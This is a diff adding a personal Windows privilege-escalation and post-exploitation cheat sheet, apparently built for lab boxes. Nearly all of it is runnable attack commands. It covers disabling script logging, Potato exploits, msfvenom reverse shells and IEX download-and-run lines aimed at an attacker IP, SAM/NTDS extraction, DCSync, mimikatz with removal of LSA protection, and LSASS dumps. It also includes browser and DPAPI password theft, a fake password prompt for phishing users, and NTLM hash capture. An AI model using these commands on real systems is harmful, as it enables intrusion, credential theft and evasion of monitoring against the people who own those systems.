@@ -1,0 +1,865 @@
+disable script logging
+$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
+$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
+
+
+check if JEA (just engouh adminstration) is enabled
+
+command
+
+if in the results you find non-default omdlets
+Set-PSSessionConfiguration
+Start-Process
+New-Service
+Add-Computer
+
+it means JEA is not enabled
+
+enumerate tokens
+ Whoami /all 
+If:
+
+SeImpersonatePrivilege token is enabled then I will be using:
+
+ JuicyPotato ( for older verions)
+Nano shell.bat (it contains my reverse shell code e.g
+Cmd /c powershell IEX(New-Object Net.WebClient).downloadString(‘http://<my_ip>:8000/shell.ps1’)
+
+Then I need to transport JuicyPotato.exe and shell.bat to the target and execute 
+
+.\JuicyPotato.exe -p shell.bat -t * -c <CLSID_from_Internet> -l 9999
+
+RottenPotato (for newer versions)
+
+ Msfvenom –p windows/x64/shell_reverse_tcp lhost=<my_ip> lport=5555 –f exe > shell.exe
+
+Transport RottenPotato.exe and shell.exe to the target and then
+.\RottenPotato.exe * shell.exe
+
+RoguePotato (for newer versions)
+Transport RoguePotato.exe to the target and then
+.\RoguePotato.exe -r <my_ip> -e <cmd> -c <CLSID_from_internet> -l 9999
+
+SeLoadDriver (allows to load a malicious driver)
+
+SeBackupPrivilege
+
+reg save HKLM\SAM C:\users\<username>\Desktop\SAM
+reg save HKLM\SYSTEM C:\users\<username>\Desktop\SYSTEM
+
+#transport into your machine
+
+python secretsdump.py LOCAL -sam SAM -system SYSTEM
+
+#and you will get hashes
+
+
+                       or
+robocopy /b C:\Windows\NTDS C:\Users\<username>\Documents NTDS.dit
+
+#if you got an error message
+“The process cannot access the file because it is used by another process”
+then
+
+cd C:\users\<username>\Documents
+mkdir salmonella
+cd simonella
+echo “set context persistent nowriters” | out-file ./diskshadow.txt -encoding ascii
+echo “add volume c: alias temp” | out-file ./diskshadow.txt -encoding ascii -append
+echo “create” | out-file ./diskshadow.txt -encoding ascii -append
+echo “expost %temp% z:” | out-file ./diskshadow.txt -encoding ascii -append
+cat diskshadow.txt
+
+diskshadow.exe /s C:\temp\diskshadow.txt
+
+cd z:
+cd Windows
+cd NTDS
+dir #you should see ntds.dit file there
+
+robocopy /b .\ C:\users\<username>\Documents\simonella NTDS.dit
+cd C:\users\<username>\Documents\simonella
+#you should have ntds.dit file there
+
+reg save HKLM\SYSTEM .\SYSTEM
+
+mount impacket/smbserver
+
+copy ntds.dit <mounted>
+copy SYSTEM <mounted>
+
+python secretsdump.py LOCAL -ntds ntds.dit -SYSTEM SYSTEM
+
+#and you will get hashes
+
+                  or
+
+chmod 777 /srv/smb
+
+Systemctl start smbd  
+ 
+
+Echo Y| wbadmin start backup –backuptarget:\\<my_ip>\simon -include:c:\windows\ntds
+
+#on my terminal I should get WindowsImageBackup
+
+Wbadmin get versions
+
+Echo Y | wbadmin start recovery –version:<version> -itemtype:file –items:C:\windows\ntds\ntds.dit
+-recoverytarget:c:\ -notrestoreacl
+
+#this should give me a ntds.dit file – transport the file to your machine
+
+Reg save HKLM\SYSTEM C:\SYSTEM
+
+#transport system partition to your machine
+
+Python3 secretsdump –ntds ntds.dit -system SYSTEM LOCAL
+
+
+enumerate groups,
+Net users #to get all users
+Net user <user>
+Net groups #to get all groups
+
+especially interesting groups are 
+
+Account Operators ( I can create a new user and add this user to the group of my choosing but there are some limits e.g I cannot add my newly created user to the Administrator groups)
+Especially interesting groups worth to be added:
+-SSH
+-WinRM
+-LAPS
+-Exchange Windows Permissions  
+
+
+Net user simon pass123 /add /domain
+Net group “<group_of_my_choosing>” /add simon
+
+                    or
+
+$pass=ConvertTo-SecureString “<compromsied_password>” -AsPlainText -Force
+$creds=New-Object System.Management.Automation.PSCredential(“<domain>\<compromised_user>”,$pass)
+
+New-AdUser simon -Credential $creds -Enabled $true -AccountPassword $pass
+
+Net group “<group_of_my_choosing>” /add simon
+
+
+LAPS(local administrator password solution) - as a member of  LAPS  group I can read randomly generated Administrator password
+
+Get-AdComputer <hostname> -property “ms-mcs-admpwd”
+                         or
+
+laps_dumper script (see Appendix for the code)
+
+python laps_dumper.py -l <victim_ip> -u <compromised_user> -p <compromised_password>
+
+#Now i should have a RANDOM adminstrator password so I can psexec.py
+
+Server Operators
+Sc.exe config UsoSvc start=auto
+Sc.exe config UsoSvc binpath=”cmd /c powershell IEX(New-Object …)”
+Sc.exe stop UsoSvc
+Sc.exe start UsoSvc
+
+DNS Admins
+Msfvenom –a x64 –p windows/x64/shell_reverse_tcp lhost=<my_ip> lport=<my_port>  -f dll > shell.dll
+
+Transport shell.dll to the target and execute
+
+Dnscmd 127.0.0.1 /config /serverlevelplugindll shell.dll
+
+Sc.exe stop dns
+Sc.exe start dns
+
+And you should get a shell
+
+Backup_Admins – I can go to the Administrator directory just like that
+
+Administrators – I can go to the Administrator directory just like that 
+
+Remote Management Use – I can use WinRM (evil-WinRm.rb – see Appendix for the code)
+
+
+AD Recycle Bin (I can query deleted items)
+
+Get-ADObject  -SearchBase “CN=Deleted Objects,DC=..,DC=,..” -Filter {ObjectClass –eq “user” } -IncludeDeletedObjects –Properties * 
+
+#to get DC=..,DC=,, I execute  Get-ADUser <anything>
+
+or
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+
+Azure Admins 
+Powershell AzureAdmins.ps1 (see Appendix for the code)
+
+SSH - I can SSH to the box
+
+Exchange Windows Permissions -
+Transport PowerView.ps1 to the target
+
+Add-DomainObjectAcl -Credential $creds -TargetIdentity “DC=htb,DC=local” -PrincipalIdentity <compromised_user> -Rights DCSync
+
+and then
+python secresdump.py <domain>/<compromised_user>:<compromised_password>@<target_ip>
+
+Event Log Readers (I can read logs)
+
+(see Appendix for the code)
+Transport Get-Event.ps1 to the target and then
+
+Get-WinEvent -FilterHashtable @{Logname='security';id=4688} | Get-WinEventData | fl * > events
+
+#transport file events into a windows machine and #read the content
+
+or
+
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+
+or
+
+Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+
+
+check if a compromised user has a full control
+
+$acl=get-acl HKLM:\System\CurrentControlSet\Services
+ConvertFrom-SddlString  -Sddl $acl.Sddl -type RegistryRights | Foreach-Object {$_.DiscretionaryAcl}
+
+This will give me a list of users and what they are allowed to do and if my compromised user has a ‘full control’ then I execute
+
+Cd HKLM:\System\CurrentControlSet\Services
+
+Set-itemproperty –path wuauserv –Name ImagePath –value “<cmd>”
+
+(to check is you modified ImagePath)
+get-item wuauserv
+ 
+Start-service wuauserv #and i should get Administrator access”
+
+
+If the box is part of the AD, then 
+I will be dropping “SharpHound” to analyze everything in the “BloodHound”
+for exe version
+.\SharpHound.exe -c all
+
+for powershell version
+Invoke-Bloodhound -CollectionMethod All
+
+enumerate domain controllers
+Get-ADDomainController
+Get-ADDomainController -Identity <DomainName>
+
+,enumerate domain computers
+Get-ADComputer -Filter * -Properties *
+Get-ADGroup -Filter * 
+
+,enumerate domain trust
+Get-ADTrust -Filter *
+Get-ADTrust -Identity <DomainName>
+
+enumerate forest trust
+Get-ADForest
+Get-ADForest -Identity <ForestName>
+
+#Domains of Forest Enumeration
+(Get-ADForest).Domains
+
+
+
+I will be stealing NTLM hashes
+Get-Content \\<my_ip>\simonella
+
+
+                     Or
+
+
+Sqlcmd –q “xp_dirtree ‘\\<my_ip>\simonella’”
+
+                      Or
+
+
+Cd C:\Program Files\Windows Defender
+
+.\MpCmdRun.exe -Scan –ScanType 3 –file \\<attacker_ip>\simonella    
+
+
+I will be trying to get stored credentials for other users  
+ 
+
+Cmdkey /list
+
+                  or
+
+#check if you are in 64bit process
+[environment]::Is64BitProcess
+
+#if you are NOT in 64 bit then try to get another shell via C:\Windows\SysNative\WindowsPowershell\v1.0\powershell IEX(...)
+C:\Windows\System32\WindowsPowershell\v1.0\powershell IEX(...)
+
+Once you are in 64 bit process, execute the following:
+
+$DefaultUsername=$(Get-ItemProperty -Path “HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon” -Name DefaultUsername -ErrorAction SilentlyContinue).DefualtUsername
+
+$DefaultPassword=$(Get-ItemProperty -Path “HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon” -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
+
+                   or
+req query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon” /v DefaultUsername /reg:64
+
+req query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon” /v DefaultPassword /reg:64
+
+
+or
+
+vaultcmd /listcreds:"Windows Credentials" /all
+
+or
+
+rundll32 keymgr.dll, KRShowKeyMgr
+
+check if WDigest is enabled (provides credentials protection)
+
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+
+if the values does not exist or is “0” it means that WDigest is deactivated
+
+
+check if LSA protection is enabled
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
+
+if values does not exist or is equal “0” it means that LSA protection is deactivated
+
+check if credentials guard is enabled
+
+reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
+
+if values does not exist or is equal “0” it means that LSA protection is deactivated
+. If the value is "1" the it is active with UEFI lock, if "2" is active without lock
+
+dumping SAM and SYSTEM partition  
+ 
+Reg save HKLM\SAM C:\SAM
+Reg save HKLM\System C:\SYSTEM
+And then transport them to my machine and use “python secretsdump.py” against them to extract credentials
+                           
+                        Or
+
+CD C:\Windows\System32\config
+#if you have enough permissions to go into this directory then you can find SAM and SYSTEM partition there so transport into your machine and read the content
+
+or
+
+vssadmin create shadow /for=C:
+#Copy SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
+#Copy SYSTEM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
+#Copy ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit
+
+or
+
+$service=(Get-Service -name VSS)
+if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
+$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
+$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
+cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
+$voume.Delete();if($notrunning -eq 1){$service.Stop()}
+
+
+Checking if AlwaysInstalledElevated is enabled
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+
+If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\SYSTEM.
+
+msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker_ip> lport=<attacker_port> -f msi > shell.msi
+
+Transport shell.msi into the target
+
+msiexec /q /i shell.msi
+
+and you should get the shell
+
+
+  Query registers  for key names and passwords              
+
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+REG QUERY HKLM /F "password" /t REG_SZ /S /d
+REG QUERY HKCU /F "password" /t REG_SZ /S /d
+
+
+#we will get a bunch of paths 
+
+Reg query <HKLM...> #results of the above command
+
+
+
+Run mimikatz to extract credentials
+for .exe version
+
+mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" “sekurlsa::wdigest” "exit"
+
+for .ps1 version
+
+Invoke-Mimikatz -DumpCreds -ComputerName @(‘<hostname>’)
+
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" “sekurlsa::wdigest” "exit"'
+
+#and I will be provided with NTLM hashes
+
+                   
+If you got the error kuhl_m_sekurlsa_acquireLSA it means that LSA protection is enabled but you can bypass it, by taking advantage of the mimikatz driver - mimidrv.sys
+
+./mimikatz.exe !+ “exit”
+
+#this should register mimidrv.sys
+
+./mimikatz.exe !processprotect /process:lsass.exe /remove
+#now you removed the protection so reuse you credential dumping command
+
+
+to get password of scheduled tasks
+
+mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
+
+running comsvc to dump credentials
+
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 680 C:\temp\lsass.dmp
+
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
+
+
+And LSAS dump files (lsass.dmp)  can be read by using pypykatz
+
+Pypykatz lsa mindump <lsass_file>
+
+running procdump to extract credentials
+
+C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+#stealthier version, with PID instead of name
+get-process -Name LSASS
+C:\procdump.exe -accepteula -ma <PID> lsass.dmp
+
+
+//Load the dump
+mimikatz # sekurlsa::minidump lsass.dmp
+//Extract credentials
+mimikatz # sekurlsa::logonPasswords
+
+or you can use pypykatz lsa minidump lsass.dmp
+
+or
+
+sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
+sc start TrustedInstaller
+
+#you should get the error message
+
+“The service did not respond to the start or control request in a timely fashion”
+
+but go to your target directory and there you should see lsass.dmp
+
+
+
+
+Checking history files
+
+ for powershell 
+
+C:\users\<username>\AppData\Roaming\Microsoft\Windows\powershell\PSReadLine
+
+
+for mozilla
+
+C:\users\<username>\AppData\Roaming\Mozilla\FireFox\Profiles\*.default-release\key4.db  and logins.json
+
+
+
+#transport key4.db and logins.json into your machine and launch firepwd.py  script to get passwords (see appendix for the code)
+
+Path interception
+# List contents of the PATH environment variable
+# EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
+$env:Path
+
+if any folder is listed before C:\Windows\System32
+# See permissions of that folder
+# EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
+icacls.exe "C:\Program Files\nodejs\"
+
+if you have Writable permissions
+# Place the evil exe file in that folder.
+copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
+
+run cmd.exe
+Because (in this example) "C:\Program Files\nodejs" is before "C:\WINDOWS\system32" on the PATH variable and we have read/write permissions to this directory, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder
+
+enumerate installed programs
+
+Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+
+if you have:
+MSRemoteNG
+Cd C:\users\<username>\AppData\Roaming\mRemoteNG
+Type confcons.xml
+And get passwords for users/admins
+Then go to your /opt/mRemoteNG-decrpyt tool to decrypt passwords
+
+
+FireFox
+Transport procdump64.exe into a target
+.\procdump64.exe -ma <PID_Firefox>
+#you will get <file>.dmp
+
+Read the file 
+
+
+
+enumerate policy file 
+
+
+C:\ProgramData\Microsoft\Group Policy\History\<policy_no.>\Machine\Preferences\Groups
+
+or
+
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
+
+
+
+searched for cached GPP passwords
+
+Search in C:\ProgramData\Microsoft\Group Policy\history or in C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history (previous to W Vista) for these files:
+Groups.xml
+Services.xml
+Scheduledtasks.xml
+DataSources.xml
+Printers.xml
+
+#To decrypt these passwords you can decrypt it using
+gpp-decrypt <gpp_password>
+
+
+
+
+check for IIS web config file
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+type C:\inetpub\wwwroot\web.config
+
+
+
+Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+
+
+ask user for his credentials (very risky)
+it will display a box to the ser asking him to retype his password
+
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
+
+#Get plaintext
+$cred.GetNetworkCredential() | fl
+
+
+
+Check the internal ports (especially interesting are SSH and WinRM to provide easy access)
+
+ Netstat –ato | findstr “LISTENING”
+upload chisel and perform port forwarding
+
+.\chisel.exe client <attacker_ip:port> R:81:<gateway_ip>:<interesting_port>
+
+#from your terminal 
+nmap -A 127.0.0.1 -p <forwared_port>
+
+List processes
+Tasklist
+       or
+Get-Process
+
+ or
+
+get-service
+
+if explorer process is running then:
+
+msfvenom windows/x64/meterpreter/reverse_tcp lhost=<attacker_ip> lport=<attacker_port> -f exe > shell.exe
+transport the file into victim and launch it
+
+msf> use exploit/mullti/handler
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+after getting connection via metasploit 
+
+
+meterpreter> ps
+find PID of the explorer process
+
+meterpreter> migrate <PID_exploiter>
+
+meterpreter> screenshare
+
+and you will get screenshare of the victim’s desktop with all the information currently on it 
+
+
+if Firefox process is running
+
+#Transport procdump64.exe into a target
+
+.\procdump64.exe -ma <PID_Firefox>
+#you will get <file>.dmp
+
+Read the file 
+
+
+Scan the internal network
+To find a network range
+
+ipconfig /all
+
+Get-Content C:\WINDOWS\System32\drivers\etc\hosts
+
+Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
+
+ipconfig /displaydns | findstr "Record" | findstr "Name Host"
+
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4AddressGet-
+
+Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+
+route print
+
+arp -a
+
+
+
+Once I have the network range
+O can find alive hosts
+
+$ping = New-Object System.Net.Networkinformation.Ping
+1..254 | % { $ping.send("10.9.15.$_") | select address, status }
+
+                                
+
+Once I have alived hosts I can find open ports
+ 
+Get-NetComputer -Ping
+
+<interesting_ports> | $ {Test-NetConnection -ComputerName <hostname_or_IP> -Port $_ }
+              
+
+check the password policy
+net accounts
+
+
+check domain policy
+
+Get-NetDomainController
+Get-NetDomainController -Domain <DomainName>
+Get-DomainPolicy
+
+#Will show us the policy configurations of the Domain about system access or kerberos
+(Get-DomainPolicy)."system access"
+(Get-DomainPolicy)."kerberos policy"
+
+
+list available drives
+Get-PSDrive
+cd <drive_name>:
+
+especially interesting are
+HCU
+HCKU
+HKLM
+
+HKCU\Software\ORL\WinVNC3\PasswordHKCU\Software\ORL\WinVNC3\Password
+
+HKLM\SYSTEM\CurrentControlSet\Services\SNMPHKLM\SYSTEM\CurrentControlSet\Services\SNMP
+
+HKCU\Software\TightVNC\ServerHKCU\Software\TightVNC\Server
+
+HKCU\Software\OpenSSH\Agent\KeyHKCU\Software\OpenSSH\Agent\Key
+
+check hidden directories
+
+dir -hidden
+gci -force
+
+check saved wi-fi connections
+netsh wlan show profile #AP SSID
+netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
+
+check for saved SSH keys
+
+reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
+
+check for unattended.xml files
+C:\Windows\sysprep\sysprep.xml
+C:\Windows\sysprep\sysprep.inf
+C:\Windows\sysprep.inf
+C:\Windows\Panther\Unattended.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\System32\Sysprep\unattend.xml
+C:\Windows\System32\Sysprep\unattended.xml
+C:\unattend.txt
+C:\unattend.inf
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
+
+check for cloud credentials
+
+#From user home
+.aws\credentials
+AppData\Roaming\gcloud\credentials.db
+AppData\Roaming\gcloud\legacy_credentials
+AppData\Roaming\gcloud\access_tokens.db
+.azure\accessTokens.json
+.azure\azureProfile.json
+
+
+Check for vulnerable certificates
+
+#Download SharpCOllections -> NetFramework_4.5
+.\Certify.exe find /vulnerable /currentuser 
+
+#ifyou got a vulnerable certificate there is a chance that you can login as another user by using the altered certificate
+
+# transport and Use ADCS.ps1 and PowerView.ps1 on the target
+
+
+Get-SmartCardCertificate -Identity Administrator -TemplateName <name_from_result_of_above> -NoSmartCard -Verbose
+
+#there will be no output but keep going
+
+gci cert:\currentuser\my -recurse
+
+#if the above command got you no response, but you #already know that certificate is vulnerable  then
+
+nano ADCS.ps1 and change
+$TargetUPN=$user.Userprincipalname
+into
+$TargetUPN=$user.samaccountname
+
+and now relaunch the above commands
+
+
+#If you got the Thumbprint you can proceed further
+#download reubeus.exe from SharpCollections
+
+.\rubeus.exe asktgt /user:Administrator /certificate:<thumbprint_from_above> /getcredentials
+
+#If successful , you will get NTLM hash for Administrator
+
+
+check the content of the clipboard
+
+get-clipboard
+
+check the content of a recycle bin
+
+$shell = New-Object -com shell.application
+$rb = $shell.Namespace(10)
+$rb.Items()
+
+#copy the value of Path parameter
+type ‘<value_of_PATH_paramaeter>’
+
+Check the content of SQLite database fo Sticky Notes
+C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
+
+check scheduled tasks
+
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+
+check DPAPI secrets
+
+cd C:\Users\<user>\APPDATA\Roaming\Microsoft\protect
+C:\Users\<user>\APPDATA\Local\Microsoft\protect
+
+dir
+
+#In the protect directory,you will find the SID of the user - copy this SID, it will be used later
+
+cd \<SID>
+
+gci -force
+
+#you should find files made of numbers with dashes
+eg 3ebf1d50-8fbbc…
+
+certutil -encode <3ebf1d50-8fbbc…> file1.b64
+cat file1.b64
+
+ and copy to your machine where you decode them
+
+Now we go to the location where DPAPI stores “Login Data”
+
+cd C:\Users\<user>\APPDATA\roaming\microsoft\credentials
+
+gci -force
+
+            or
+
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+               or
+cd
+C:\Users\<user>\APPDATA\local\microsoft\credentials
+gci -force
+
+             or
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+
+or
+
+c:\users\<user>\APPDATA\local\micorosoft\edge\User Data\Default
+
+gci -force
+
+Once we found the “Login Data” file 
+
+certutil -encode “Login Data” login.b64 
+transport to your machine and decode as 
+
+base64 -d login.b64 > login.sqlite
+
+#back to the victim machine
+
+cd C:\Users\<user>\APPDATA\local\microsoft\edge\User Data\
+type “Local State”
+
+#copy its content to your machine as a “state” file
+
+the most important file is “encrypted key”
+
+cat state | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > dpapi_blob
+
+pypykatz dpapi describe blob dpapi_blob
+
+this will give us a lot of information but the most important is “masterkey_guid”
+copy it
+
+pypykatz dpapi prekey password <SID> <compromised_user_password>  > prekey_file
+
+pypykatz dpapi masterkey <master_key_guid> prekey_file -o masterkey_file
+
+pypykatz dpapi chrome –logindata login.sqlite masterkey_file state
+
+And you should get a few passwords that you can use to get admin access
+
+
+check what DCOM application are using powershell
+Get-CimInstance Win32_DCOMApplicationGet-CimInstance Win32_DCOMApplication
+
+
